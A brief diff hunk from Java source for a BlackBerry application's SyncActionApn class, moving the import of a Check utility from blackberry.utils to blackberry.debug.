@@ -16,9 +16,9 @@ import net.rim.device.api.util.DataBuffer;
 import blackberry.action.Apn;
 import blackberry.action.sync.transport.ApnTransport;
 import blackberry.action.sync.transport.Wap2Transport;
+import blackberry.debug.Check;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
-import blackberry.utils.Check;
 import blackberry.utils.WChar;
 
 public class SyncActionApn extends SyncAction {
